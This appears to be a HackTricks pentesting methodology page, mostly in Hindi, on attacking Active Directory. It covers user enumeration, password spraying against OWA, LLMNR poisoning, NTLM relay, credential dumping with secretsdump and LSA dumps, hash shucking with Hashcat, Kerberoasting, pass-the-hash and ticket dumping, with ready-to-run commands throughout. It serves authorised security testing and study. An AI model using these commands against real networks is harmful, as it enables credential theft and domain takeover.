# Active Directory कार्यप्रणाली

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी अवलोकन

**Active Directory** एक बुनियादी तकनीक के रूप में काम करती है, जो **नेटवर्क प्रशासकों** को नेटवर्क के भीतर **डोमेन्स**, **यूज़र्स**, और **ऑब्जेक्ट्स** को प्रभावी रूप से बनाने और प्रबंधित करने में सक्षम बनाती है। यह स्केलेबल तरीके से डिज़ाइन की गई है, जो बड़े पैमाने पर यूज़र्स को प्रबंधनीय **ग्रुप्स** और **सबग्रुप्स** में व्यवस्थित करने तथा विभिन्न स्तरों पर **एक्सेस राइट्स** को नियंत्रित करने की सुविधा देती है।

**Active Directory** की संरचना तीन मुख्य परतों से मिलकर बनी होती है: **domains**, **trees**, और **forests**। एक **domain** उन ऑब्जेक्ट्स का समूह होता है, जैसे **users** या **devices**, जो एक सामान्य डेटाबेस साझा करते हैं। **Trees** उन domains के समूह होते हैं जो एक साझा संरचना से जुड़े होते हैं, और एक **forest** कई trees का संग्रह होता है, जो आपस में **trust relationships** के ज़रिए जुड़ा होता है और संगठनात्मक संरचना की सबसे ऊपरी परत बनाता है। प्रत्येक स्तर पर विशिष्ट **access** और **communication rights** निर्दिष्ट किए जा सकते हैं।

Active Directory के प्रमुख कॉन्सेप्ट्स में शामिल हैं:

1. **Directory** – Active Directory ऑब्जेक्ट्स से संबंधित सभी जानकारी का भंडार।
2. **Object** – डायरेक्टरी के अंदर के इकाइयाँ, जिनमें **users**, **groups**, या **shared folders** शामिल हैं।
3. **Domain** – डायरेक्टरी ऑब्जेक्ट्स के लिए कन्टेनर का कार्य करता है; एक **forest** के भीतर कई domains सह-अस्तित्व में रह सकते हैं, हर एक अपनी ऑब्जेक्ट कलेक्शन के साथ।
4. **Tree** – domains का एक समूह जो एक साझा root domain साझा करते हैं।
5. **Forest** – Active Directory में संगठनात्मक संरचना की शीर्ष परत, जो कई trees से मिलकर बनी होती है और उनके बीच **trust relationships** होते हैं।

**Active Directory Domain Services (AD DS)** कई सेवाओं को समेटता है जो नेटवर्क में केंद्रीकृत प्रबंधन और संचार के लिए महत्वपूर्ण हैं। ये सेवाएँ शामिल हैं:

1. **Domain Services** – डाटा स्टोरेज को केंद्रीकृत करता है और **users** तथा **domains** के बीच इंटरैक्शन जैसे **authentication** और **search** सुविधाओं का प्रबंधन करता है।
2. **Certificate Services** – सुरक्षित **digital certificates** के निर्माण, वितरण और प्रबंधन की देखरेख करता है।
3. **Lightweight Directory Services** – **LDAP protocol** के माध्यम से डायरेक्टरी-सक्षम एप्लिकेशन का समर्थन करता है।
4. **Directory Federation Services** – कई वेब एप्लिकेशन्स में **single-sign-on** सुविधाएँ प्रदान करता है ताकि उपयोगकर्ता एक ही सत्र में प्रमाणीकृत हो सकें।
5. **Rights Management** – कॉपीराइट सामग्री की असमर्थित वितरण और उपयोग को नियंत्रित करके उसकी रक्षा में मदद करता है।
6. **DNS Service** – **domain names** के रेज़ोल्यूशन के लिए महत्वपूर्ण है।

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

यदि आप यह जानना चाहते हैं कि **attack an AD** कैसे करना है, तो आपको **Kerberos authentication process** को बहुत अच्छी तरह से **understand** करना होगा।\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## चीट शीट

आप एक त्वरित अवलोकन के लिए [https://wadcoms.github.io/](https://wadcoms.github.io) पर जा सकते हैं यह देखने के लिए कि AD को enumerate/exploit करने के लिए कौन-कौन से कमांड्स चलाए जा सकते हैं।

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

यदि आपके पास केवल AD वातावरण तक पहुँच है पर आपके पास कोई credentials/sessions नहीं हैं तो आप कर सकते हैं:

- **Pentest the network:**
- नेटवर्क को स्कैन करें, मशीनें और खुले पोर्ट ढूँढें और **vulnerabilities** का **exploit** करने की कोशिश करें या उनसे **credentials** निकालने की कोशिश करें (उदाहरण के लिए, [printers could be very interesting targets](ad-information-in-printers.md) ).
- DNS का enum करने से डोमेन के अंदर key servers के बारे में जानकारी मिल सकती है जैसे web, printers, shares, vpn, media, आदि।
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- अधिक जानकारी के लिए General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) देखें।
- **Check for null and Guest access on smb services** (यह modern Windows versions पर काम नहीं करेगा):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB सर्वर को enumerate करने के बारे में अधिक विस्तृत गाइड यहाँ मिल सकती है:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP को enumerate करने के बारे में अधिक विस्तृत गाइड यहाँ मिल सकती है (विशेषकर **anonymous access** पर ध्यान दें):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder के साथ सेवाओं का impersonating करके credentials इकट्ठा करें [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) द्वारा host तक पहुँच प्राप्त करें
- **fake UPnP services with evil-S** प्रदर्शित करके credentials इकट्ठा करें (exposing) [**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- आंतरिक दस्तावेज़ों, सोशल मीडिया, सेवाओं (मुख्यतः वेब) और सार्वजनिक रूप से उपलब्ध स्रोतों से यूज़रनेम/नाम निकालें।
- यदि आपको कंपनी कर्मचारियों के पूरे नाम मिल जाते हैं, तो आप विभिन्न AD **username conventions** आज़मा सकते हैं (**read this**). सबसे सामान्य conventions हैं: _NameSurname_, _Name.Surname_, _NamSur_ (3 अक्षर प्रत्येक से), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- टूल्स:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** देखें [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) और [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) पेज।
- **Kerbrute enum**: जब कोई **invalid username is requested** होता है तो सर्वर **Kerberos error** कोड _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ के साथ प्रतिक्रिया देगा, जिससे हम यह पता लगा सकते हैं कि username अमान्य था। **Valid usernames** या तो **TGT in a AS-REP** रिस्पॉन्स में देंगे या त्रुटि _KRB5KDC_ERR_PREAUTH_REQUIRED_ देंगे, जो संकेत करता है कि user को pre-authentication करने की आवश्यकता है।
- **No Authentication against MS-NRPC**: domain controllers पर MS-NRPC (Netlogon) इंटरफ़ेस के खिलाफ auth-level = 1 (No authentication) का उपयोग करके। यह मेथड MS-NRPC इंटरफ़ेस को bind करने के बाद `DsrGetDcNameEx2` फ़ंक्शन को कॉल करता है ताकि बिना किसी credentials के यह जांचा जा सके कि user या computer मौजूद है या नहीं। इस प्रकार के enumeration को NauthNRPC टूल लागू करता है: https://github.com/sud0Ru/NauthNRPC। रिसर्च यहाँ मिल सकती है: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

यदि आप नेटवर्क में इन सर्वरों में से किसी एक को पाते हैं, तो आप इसके खिलाफ **user enumeration** भी कर सकते हैं। उदाहरण के लिए, आप टूल [**MailSniper**](https://github.com/dafthack/MailSniper) का उपयोग कर सकते हैं:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> आप username की सूचियाँ [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  और इस एक ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) में पा सकते हैं।
>
> हालांकि, आपके पास उस recon चरण से कंपनी में काम करने वाले लोगों के **नाम** होना चाहिए जिसे आपको पहले करना चाहिए था। नाम और उपनाम के साथ आप स्क्रिप्ट [**namemash.py**](https://gist.github.com/superkojiman/11076951) का उपयोग संभावित वैध usernames जनरेट करने के लिए कर सकते हैं।

### किसी एक या कई usernames का पता होना

ठीक है — आपके पास पहले से ही एक वैध username है लेकिन कोई passwords नहीं... तो कोशिश करें:

- [**ASREPRoast**](asreproast.md): यदि किसी user के पास attribute _DONT_REQ_PREAUTH_ नहीं है तो आप उस user के लिए **AS_REP message** request कर सकते हैं जो उस user के password की derivation से encrypted कुछ data रखेगा।
- [**Password Spraying**](password-spraying.md): खोजे गए प्रत्येक user के साथ सबसे **common passwords** आजमाएँ — शायद कोई user खराब password इस्तेमाल कर रहा हो (password policy का ध्यान रखें!)।
- ध्यान दें कि आप users के mail servers तक पहुँचने के लिए **spray OWA servers** भी कर सकते हैं।


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

आप शायद कुछ challenge **hashes** प्राप्त कर सकें, जिन्हें network के कुछ protocols को **poisoning** करके crack किया जा सकता है:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

यदि आप Active Directory को enumerate करने में सफल रहे हैं तो आपके पास **अधिक emails और network की बेहतर समझ** होगी। आप AD env तक पहुँचने के लिए NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) को force करने में सक्षम हो सकते हैं।

### NetExec workspace-driven recon & relay posture checks

- **`nxcdb` workspaces** का उपयोग करें ताकि प्रत्येक engagement के लिए AD recon state रखा जा सके: `workspace create <name>` per-protocol SQLite DBs को `~/.nxc/workspaces/<name>` के अंतर्गत spawn करता है (smb/mssql/winrm/ldap/etc). Views बदलने के लिए `proto smb|mssql|winrm` और एकत्र किए गए secrets को सूचीबद्ध करने के लिए `creds` का प्रयोग करें। पूरा हो जाने पर संवेदनशील डेटा को मैन्युअल रूप से purge करें: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery के लिए **`netexec smb <cidr>`** उपयोग करने से **domain**, **OS build**, **SMB signing requirements**, और **Null Auth** जैसी जानकारी सामने आती है। जिन members पर `(signing:False)` दिखता है वे **relay-prone** होते हैं, जबकि DCs अक्सर signing की आवश्यकता रखते हैं।
- NetExec output से सीधे **hostnames in /etc/hosts** generate करें ताकि targeting आसान हो:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- जब **SMB relay to the DC is blocked** साइनिंग के कारण, तब भी **LDAP** की स्थिति probe करें: `netexec ldap <dc>` `(signing:None)` / weak channel binding को उजागर करता है। SMB signing आवश्यक होने पर लेकिन LDAP signing disabled रहने वाला DC अभी भी **relay-to-LDAP** लक्ष्य के रूप में व्यवहार्य रहता है, जैसे कि **SPN-less RBCD** जैसे दुरुपयोगों के लिए।

### क्लाइंट-साइड प्रिंटर credential leaks → bulk domain credential validation

- Printer/web UIs कभी-कभी **embed masked admin passwords in HTML**। source/devtools देखकर cleartext उजागर हो सकता है (उदा., `<input value="<password>">`), जिससे Basic-auth के जरिए scan/print repositories तक access मिल सकता है.
- प्राप्त print jobs में per-user passwords वाले **plaintext onboarding docs** हो सकते हैं। परीक्षण करते समय pairings को aligned रखें:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

यदि आप **null या guest user** के साथ अन्य PCs या shares तक **access** कर सकते हैं तो आप **files** (जैसे SCF file) **place** कर सकते हैं जो अगर किसी तरह access हो जाएँगी तो यह आपके खिलाफ **NTLM authentication trigger** करेंगी ताकि आप **NTLM challenge** चुराकर उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** उन सभी NT hashes को एक candidate password की तरह treat करता है जो आपके पास पहले से हैं, और उन्हें उन slower formats के लिए इस्तेमाल करता है जिनका key material सीधे NT hash से निकाला जाता है। Kerberos RC4 tickets, NetNTLM challenges, या cached credentials में लंबे passphrases brute-force करने की बजाय, आप NT hashes को Hashcat के NT-candidate modes में डालते हैं और यह password reuse को validate कर देता है बिना कभी plaintext सीखे। यह डोमेन compromise के बाद खासतौर पर प्रभावी होता है जहाँ आप हजारों current और historical NT hashes harvest कर सकते हैं।

Use shucking when:

- आपके पास DCSync, SAM/SECURITY dumps, या credential vaults से एक NT corpus है और आपको अन्य domains/forests में reuse की जाँच करनी है।
- आपने RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, या DCC/DCC2 blobs capture किए हैं।
- आप जल्दी से long, uncrackable passphrases के reuse को साबित करना चाहते हैं और तुरंत Pass-the-Hash के जरिए pivot करना चाहते हैं।

यह technique उन encryption types के खिलाफ काम नहीं करती जिनकी keys NT hash नहीं होती (उदा., Kerberos etype 17/18 AES)। यदि कोई domain केवल AES-only लागू करता है, तो आपको regular password modes पर वापस जाना होगा।

#### Building an NT hash corpus

- **DCSync/NTDS** – सबसे बड़ा संभव सेट of NT hashes (और उनके previous values) पाने के लिए `secretsdump.py` का history के साथ उपयोग करें:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries candidate pool को काफी बढ़ा देते हैं क्योंकि Microsoft प्रति account तक 24 previous hashes तक स्टोर कर सकता है। NTDS secrets harvest करने के और तरीकों के लिए देखें:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (या Mimikatz `lsadump::sam /patch`) local SAM/SECURITY data और cached domain logons (DCC/DCC2) extract करता है। इन hashes को deduplicate करके उसी `nt_candidates.txt` सूची में जोड़ें।
- **Track metadata** – हर hash के साथ उस username/domain को रखें जिसने उसे दिया था (भले ही wordlist केवल hex ही रखे)। Matching hashes से तुरंत पता चल जाता है कि किस principal ने password reuse किया है जब Hashcat winning candidate print करता है।
- उसी forest या trusted forest के candidates को prefer करें; इससे shucking के दौरान overlap की संभावना बढ़ती है।

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

नोट्स:

- NT-candidate inputs **सदैव raw 32-hex NT hashes ही रहने चाहिए**। rule engines disable करें (कोई `-r`, कोई hybrid modes नहीं) क्योंकि mangling candidate key material को corrupt कर देता है।
- ये modes स्वाभाविक रूप से तेज़ नहीं हैं, पर NTLM keyspace (~30,000 MH/s on an M3 Max) Kerberos RC4 (~300 MH/s) की तुलना में ~100× तेज़ है। curated NT सूची की जाँच slow format में पूरे password space की तलाश करने से कहीं सस्ती है।
- हमेशा **latest Hashcat build** चलाएं (`git clone https://github.com/hashcat/hashcat && make install`) क्योंकि modes 31500/31600/35300/35400 हाल ही में शिप हुए हैं।
- अभी AS-REQ Pre-Auth के लिए कोई NT mode उपलब्ध नहीं है, और AES etypes (19600/19700) के लिए plaintext password चाहिए क्योंकि उनकी keys PBKDF2 से UTF-16LE passwords से derive होती हैं, न कि raw NT hashes से।

#### Example – Kerberoast RC4 (mode 35300)

1. किसी target SPN के लिए RC4 TGS capture करें एक low-privileged user के साथ (details के लिए Kerberoast page देखें):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. अपने NT list के साथ ticket को shuck करें:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat हर NT candidate से RC4 key derive करता है और `$krb5tgs$23$...` blob validate करता है। एक match यह पुष्टि करता है कि service account आपके existing NT hashes में से किसी एक का उपयोग कर रहा है।

3. तुरंत PtH के जरिए pivot करें:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

आप चाहें तो बाद में plaintext `hashcat -m 1000 <matched_hash> wordlists/` से recover कर सकते हैं।

#### Example – Cached credentials (mode 31600)

1. एक compromised workstation से cached logons dump करें:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. दिलचस्प domain user की DCC2 लाइन को `dcc2_highpriv.txt` में copy करें और उसे shuck करें:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. सफल match यह दिखाएगा कि NT hash पहले से आपकी list में मौजूद है, जो साबित करता है कि cached user password reuse कर रहा है। इसे सीधे PtH के लिए उपयोग करें (`nxc smb <dc_ip> -u highpriv -H <hash>`) या fast NTLM mode में इसे brute-force करके plaintext recover करें।

उसी workflow को NetNTLM challenge-responses (`-m 27000/27100`) और DCC (`-m 31500`) पर भी लागू किया जा सकता है। एक बार match मिल जाए तो आप relay, SMB/WMI/WinRM PtH लॉन्च कर सकते हैं, या NT hash को masks/rules के साथ offline फिर से crack कर सकते हैं।



## Enumerating Active Directory WITH credentials/session

इस चरण के लिए आपके पास किसी valid domain account के credentials या session का compromise होना जरूरी है। अगर आपके पास कुछ valid credentials या domain user के रूप में shell है, तो आपको याद रखना चाहिए कि पहले दिए गए विकल्प अभी भी अन्य users को compromise करने के विकल्प हैं।

authenticated enumeration शुरू करने से पहले आपको **Kerberos double hop problem** क्या है यह पता होना चाहिए।


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account का compromise होना पूरे domain को compromise करने की दिशा में एक बड़ा कदम है, क्योंकि आप अब Active Directory Enumeration शुरू कर पाएँगे:

[**ASREPRoast**](asreproast.md) के संबंध में आप अब हर संभावित vulnerable user ढूँढ सकते हैं, और [**Password Spraying**](password-spraying.md) के मामले में आप सभी usernames की एक सूची निकालकर compromised account का password, empty passwords और नए promising passwords आज़मा सकते हैं।

- आप [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) का उपयोग कर सकते हैं
- आप [**powershell for recon**](../basic-powershell-for-pentesters/index.html) का भी उपयोग कर सकते हैं जो अधिक stealthier होगा
- आप अधिक detailed जानकारी निकालने के लिए [**use powerview**](../basic-powershell-for-pentesters/powerview.md) भी कर सकते हैं
- Active Directory में recon के लिए एक और शानदार tool है [**BloodHound**](bloodhound.md). यह **बहुत stealthy नहीं** है (collect करने के method पर निर्भर करता है), पर **अगर आपको इससे परेशानी नहीं है** तो इसे जरूर आज़माएँ। यह बताता है कि users कहाँ RDP कर सकते हैं, अन्य groups तक रास्ते आदि।
- **अन्य automated AD enumeration tools हैं:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- AD के [**DNS records**](ad-dns-records.md) भी देखें क्योंकि उनमें दिलचस्प जानकारी हो सकती है।
- GUI वाला एक tool जो आप directory enumerate करने के लिए उपयोग कर सकते हैं वह है **AdExplorer.exe** from **SysInternal** Suite।
- आप LDAP database में **ldapsearch** के साथ _userPassword_ & _unixUserPassword_ फील्ड्स में credentials या _Description_ के लिए भी खोज सकते हैं। अन्य तरीकों के लिए cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) देखें।
- अगर आप **Linux** उपयोग कर रहे हैं, तो आप domain enumerate करने के लिए [**pywerview**](https://github.com/the-useless-one/pywerview) भी उपयोग कर सकते हैं।
- आप automated tools भी आज़मा सकते हैं जैसे:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **सभी domain users निकालना**

Windows से सभी domain usernames प्राप्त करना बहुत आसान है (`net user /domain` ,`Get-DomainUser` या `wmic useraccount get name,sid`)। Linux में आप उपयोग कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` या `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration सेक्शन छोटा दिखे यह सबसेสำคัญ हिस्सा है। links (खासकर cmd, powershell, powerview और BloodHound वाले) खोलें, सीखें कि domain कैसे enumerate किया जाता है और तब तक practice करें जब तक आप comfortable ना महसूस करें। किसी assessment के दौरान, यह वह मुख्य क्षण होगा जब आप DA तक पहुँचने का रास्ता खोजेंगे या यह निर्णय लेंगे कि कुछ भी नहीं किया जा सकता।

### Kerberoast

Kerberoasting में उन services से जुड़ी user accounts के लिए उपयोग होने वाले **TGS tickets** प्राप्त करना और उनकी encryption (जो user passwords पर आधारित होती है) को offline crack करना शामिल है।

इस पर और जानकारी:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

जब आप कुछ credentials प्राप्त कर लेते हैं तो आप चेक कर सकते हैं कि क्या आपको किसी भी **machine** तक access मिला है। इसके लिए आप अपने port scans के अनुसार कई servers पर अलग-अलग protocols के साथ connect करने के लिए **CrackMapExec** का उपयोग कर सकते हैं।

### Local Privilege Escalation

यदि आपने एक regular domain user के रूप में credentials या session compromise कर लिया है और इस user से आपको domain में किसी भी machine तक **access** मिला है तो आपको locally privileges escalate करने और credentials loot करने की कोशिश करनी चाहिए। केवल local administrator privileges के साथ ही आप अन्य users के hashes memory (LSASS) में और locally (SAM) dump कर पाएँगे।

इस किताब में [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) पर एक पूरी page है और एक [**checklist**](../checklist-windows-privilege-escalation.md) भी। साथ ही, **WinPEAS** (https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) का उपयोग करना न भूलें।

### Current Session Tickets

यह बहुत ही **unlikely** है कि आपको current user के पास ऐसे **tickets** मिलें जो आपको unexpected resources तक access देने की permission दें, पर आप चेक कर सकते हैं:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

अब जब आपके पास कुछ बुनियादी credentials हैं, तो आपको यह जांचना चाहिए कि क्या आप **AD के भीतर साझा की जा रही किसी भी दिलचस्प फ़ाइलों को find कर सकते हैं**। आप यह मैन्युअल रूप से कर सकते हैं लेकिन यह एक बहुत उबाऊ, पुनरावर्ती कार्य है (और भी अधिक अगर आपको सैकड़ों docs मिलते हैं जिन्हें आपको चेक करना होगा)।

[**इस्तेमाल किए जाने वाले tools के बारे में जानने के लिए इस लिंक का पालन करें।**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

यदि आप **other PCs or shares तक access कर सकते हैं** तो आप **फाइलें place कर सकते हैं** (जैसे एक SCF file) जिन्हें यदि किसी तरह access किया जाता है तो यह t**rigger an NTLM authentication against you** करेगा ताकि आप **NTLM challenge** को **steal** करके उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

आशा है कि आप [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (relaying सहित), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) का उपयोग करके किसी **local admin को compromise करने** में सफल रहे होंगे।\
इसके बाद, अब समय है कि सभी hashes को memory और local रूप से dump करने का।\
[**hashes प्राप्त करने के विभिन्न तरीकों के बारे में इस पृष्ठ को पढ़ें।**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, आप इसका उपयोग करके उसे **impersonate** कर सकते हैं।\
आपको किसी ऐसे **tool** का उपयोग करना होगा जो उस **hash** का उपयोग करके **NTLM authentication perform** करे, **या** आप एक नया **sessionlogon** बना सकते हैं और वह **hash** **LSASS** के अंदर **inject** कर सकते हैं, ताकि जब भी कोई **NTLM authentication is performed**, वह **hash उपयोग में लाया जाएगा।** आखिरी विकल्प वही है जो mimikatz करता है।\
[**More information के लिए इस पेज को पढ़ें।**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

यह attack उद्देश्य रखता है कि **user NTLM hash का उपयोग करके Kerberos tickets request की जाए**, जो सामान्य Pass The Hash over NTLM protocol का एक विकल्प है। इसलिए, यह खासकर **उन नेटवर्क्स में उपयोगी हो सकता है जहाँ NTLM protocol disabled है** और केवल **Kerberos को authentication protocol के रूप में allow किया जाता है।**


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** के बजाय उनके password या hash values के। यह चोरी किया गया ticket फिर उपयोग किया जाता है ताकि attacker **impersonate the user** कर सके और नेटवर्क के अंदर resources और services तक unauthorized access प्राप्त कर सके।


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

यदि आपके पास किसी **local administrato r** का **hash** या **password** है तो आपको इसके साथ अन्य **PCs** में **login locally** करने की कोशिश करनी चाहिए।
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> ध्यान दें कि यह काफी **शोर-भरा** है और **LAPS** इससे **रोकथाम** कर देगा।

### MSSQL Abuse & Trusted Links

यदि किसी उपयोगकर्ता के पास **MSSQL instances तक पहुँच** की privileges हैं, तो वह इसे MSSQL होस्ट पर **कमान्ड निष्पादित** करने (यदि SA के रूप में चल रहा हो), NetNTLM **hash चोरी** करने या यहाँ तक कि **relay attack** करने के लिए उपयोग कर सकता है.\
इसके अलावा, अगर एक MSSQL instance दूसरे MSSQL instance द्वारा trusted (database link) है और उपयोगकर्ता के पास trusted database पर privileges हैं, तो वह **trust relationship का उपयोग करके दूसरे instance में भी queries निष्पादित कर सकेगा**। ये trusts chained हो सकते हैं और किसी बिंदु पर उपयोगकर्ता किसी misconfigured database को ढूँढ सकता है जहाँ वह कमांड्स निष्पादित कर सके।\
**Databases के बीच links forest trusts के पार भी काम करते हैं।**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

